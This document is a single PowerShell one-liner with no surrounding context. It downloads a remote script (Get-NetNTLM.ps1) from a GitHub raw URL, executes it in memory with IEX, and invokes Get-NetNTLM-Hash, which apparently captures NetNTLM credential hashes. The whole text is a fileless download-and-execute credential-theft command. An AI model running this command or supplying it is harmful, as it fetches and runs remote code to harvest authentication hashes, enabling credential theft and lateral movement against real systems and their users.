IEX (New-Object System.Net.Webclient).DownloadString(‘https://raw.githubusercontent.com/elnerd/Get-NetNTLM/master/Get-NetNTLM.ps1‘) ; Get-NetNTLM-Hash
